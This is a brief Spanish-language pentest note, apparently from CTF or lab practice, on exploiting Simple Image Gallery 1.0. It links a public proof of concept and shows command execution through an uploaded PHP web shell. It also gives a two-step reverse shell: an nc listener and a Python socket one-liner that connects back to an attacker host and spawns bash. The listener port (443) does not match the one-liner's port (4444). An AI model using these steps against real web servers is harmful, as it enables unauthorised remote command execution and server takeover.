# Simple Image Gallery 

Tags: #SimpleImageGallery 

**Simple Image Gallery** puede referirse a distintas extensiones o componentes para crear galerías de fotos; por ejemplo, existe una extensión con ese nombre para Joomla. En general, permite organizar imágenes y mostrarlas en una página web.

## Versión 1.0
* [PoC](https://www.exploit-db.com/exploits/50214)
```bash 
❯ python gallery.py 
	TARGET: IP:8080     # Colacar la IP con su puerto 8080

NOTA:
	- La idreeción original es con el puerto 8080 y la web redirecciona 
	- Este script te regresa una url con el comando 'whoami'. Esto ya te permite ejecutar comandos remotamente


# Ejecutar comando en la web 
http://IP/gallery/uploads/1792461420_TagosatheggrutodwjkLetta.php?cmd=whoami 
```

```bash 
# Ejecutar una reverhshell 
Paso 1:
❯ rlwrap nc -nlvp 443

Paso 2:
# Ejecutar el siguiente comando en la web para obtener la revershell 
http://IP/gallery/uploads/1792461420_TagosatheggrutodwjkLetta.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```